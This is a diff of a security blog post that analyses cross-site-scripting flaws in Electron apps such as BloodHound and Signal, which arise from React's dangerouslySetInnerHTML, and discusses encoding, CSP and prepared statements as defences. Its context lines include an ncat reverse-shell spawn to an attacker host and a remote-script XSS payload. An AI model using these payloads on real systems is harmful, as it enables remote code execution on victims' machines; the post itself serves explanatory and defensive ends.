@@ -65,7 +65,6 @@ So next we must determine how `.infoTabContent` is set, jumping to the next usag
 Here we see the empty string `infoTabContent` is replaced with a JavaScript object with the key `__html`, this aligns with [React's documentation](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml) of how `dangerouslySetInnerHTML` works and is a good indication we've correctly traced the code and this value is indeed passed to our sink. The `__html` key's value is the `formatted` variable. So from here we must determine what the variable is, and what it contains. Scrolling up a bit we can see that `formatted` is just a string, which is built using string interpolation with variables `${sournceName}` and `${targetName}`:
 
 #### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L228)
-
 ```javascript
 } else if (edge.label === 'SQLAdmin'){
   formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.
@@ -94,8 +93,6 @@ spawn('ncat', ['-e', '/bin/bash', '<attacker host>', '<some port>']);
 Since the GPO name is not properly encoded it will be rendered by the DOM as HTML, and Electron will parse the `<SCRIPT` tag and dutifully retrieve and execute the context of `poc.js`. As discussed before, since the NodeJS APIs are enabled this attacker controlled JavaScript can simply spawn a bash child process and execute arbitrary native code on the machine.
 
 A reasonable scenario here would be blue teams hiding malicous values in their AD deployment waiting for the red team to run Bloodhoud, and subsequently exploit the red team operator's machine. Though blue teams often also run this tool, so were a red team operator in a position to influence the data collected by Bloodhound, but otherwise had limited access to AD the exploit could go in the traditional direction too.
-
-#### HTML Encoding
 
 The most comprehensive fix for this vulnerability would be to re-write the functionality such that `dangerouslySetInnerHTML` is not needed, however from a practical perspective a lot of code would need to be refactored. A short term and effective fix is to HTML encode the attacker controlled variables. By HTML encoding these values, we can ensure these strings are never interpreted by the browser as actual HTML, and can support arbitrary characters. The prior payload: `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` will be encoded as `aaaaaa&lt;SCRIPT SRC="http://example.com/poc.js"&gt;` and will be displayed as `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` but not interpreted as HTML. So is preventing cross-site scripting a simple matter of HTML encoding attacker controlled values? Unfortunately no.
 
@@ -237,18 +234,23 @@ This exploit is an excellent example of the limitations of CSPs, a CSP _cannot_ 
 
 ### What's in a Name?
 
-A function by any other name could be so vulnable. The flaws in both Signal and Bloodhound AD stemmed from the use of [React](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon, and not a 2nd thought as to why the React developers chose such a name. If developers from the security community consistently misuse these functions, what hope do developers without a security background have?
+A function by any other name could be so vulnable. The flaws in both Signal and Bloodhound AD stemmed from the use of [React](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon.
 
-All of the aforementioned bugs are at their core Cross-site Scripting vulnerabilities (XSS), which is a terrible name. Cross-site Scripting is a actually a JavaScript _injection vulnerability_. All injection vulnerabilities occur when the "computer" cannot properly differenciate between what is data and what is an instruction, and subsequently allows an attacker to trick the "computer" into misinterpreting (attacker-controlled) data as instructions. This can be said about XSS, as well as SQL injection, command injection, etc. The core mechanics at of all these vulnerabilities are actually the same, save for what the "computer" is.
+All of the aforementioned bugs are at their core cross-site scripting vulnerabilities (XSS), which is a terrible name. Cross-site scripting is a actually a JavaScript _injection vulnerability_. All injection vulnerabilities occur when the "computer" cannot properly differenciate between what is data and what is an instruction, and subsequently allows an attacker to trick the "computer" into misinterpreting attacker-controlled data as instructions. This can be said about XSS, as well as SQL injection, command injection, etc. The core mechanics of all these vulnerabilities are actually the same, save for what the "computer" is.
 
-For example, the "computer" in a SQL injection is the SQL interpreter, and in the context of XSS the Document Object Model (DOM). If you've ever wondered the logical reason why prepared statements are not vulnerable to SQL injection, it is principally that in a prepared statement there is always a speratation of the query logic (instructions) from the data (parameters):
+The "computer" in a SQL injection is the SQL interpreter, and in the context of XSS it's the Document Object Model (DOM). If you've ever wondered the logical reason why prepared statements are not vulnerable to SQL injection, it is principally that in a prepared statement there is always a speratation of the query logic (instructions) from the data (parameters). Thus there is no ambiguity between instruction and data for an attacker to abuse:
 
 ```php
 $stmt = $conn->prepare("INSERT INTO Users (firstname, lastname, email) VALUES (?, ?, ?)");
 $stmt->bind_param("sss", $firstname, $lastname, $email);
 ```
 
-The logic (i.e. the query) is first passed to the `prepare()` function, then the data (i.e. parameters) are subsequently passed in a seperate `bind_param()` function call. This prevents any possibility of the database misinterpreting use controlled data as SQL instructions. However, an application that exclusively makes use of prepared statements is not automatically "secure," though it may be free of this one particular vulnerability, care still must be taken when designing an application --SQL injection is not the only vulnerability that can result in an attacker stealing data from the database.
+In the PHP prepared statemate above, the logic (i.e. the query) is first passed to the `prepare()` function, then the data (i.e. parameters) are subsequently passed in a seperate `bind_param()` function call. This prevents any possibility of the database misinterpreting user controlled data (e.g. `$firstname`) as SQL instructions. However, an application that exclusively makes use of prepared statements is not automatically "secure," though it may be free of this one particular vulnerability, care still must be taken when designing an application --SQL injection is not the only vulnerability that can result in an attacker stealing data from the database.
+
+So is CSP the DOM analog to SQL prepared statements? Not really, CSP allows the programmer to add metadata to an HTTP response telling the browser how to distinguish _where_ instructions (i.e. `script-src`, etc) can be loaded from. CSP is very much like [Data Execution Prevention](https://en.wikipedia.org/wiki/Executable_space_protection) (buffer overflows are an injection vulnerability where data on the stack is mistaken for instructions) it only makes distinctions on the _where_. Similar to DEP, CSP can bypassed by loading instructions from areas (i.e. origins) that are already "executable" --if we can find an initial injection point. Just as DEP does not make `strcpy()` safe to use in any context, nor does CSP make safe things like `dangerouslySetInnerHTML()` or `.innerHTML`. CSP and DEP only kick in _after_ the injection has occured, they're seatbelts.
+
+"[Trusted Types](https://developers.google.com/web/updates/2019/02/trusted-types) allow you to lock down the dangerous injection sinks - they stop being insecure by default, _and cannot be called with strings_."
+
 
 ## Reasonably Secure
 
@@ -300,7 +302,7 @@ export function requestHandler(req: Electron.RegisterBufferProtocolRequest, next
 
 From personal preference we'll use TypeScript, with a few execeptions where using TypeScript needlessly complicates the build process (e.g. `preload.js`).
 
-#### `main.ts`
+#### [`main.ts`]()
 ```typescript
 const mainWindow = new BrowserWindow({
   webPreferences: {
@@ -322,7 +324,7 @@ const mainWindow = new BrowserWindow({
 
 The preload script is just a small snippted of JavaScript:
 
-#### `preload.js`
+#### [`preload.js`]()
 ```javascript
 const { ipcRenderer } = require('electron');
 
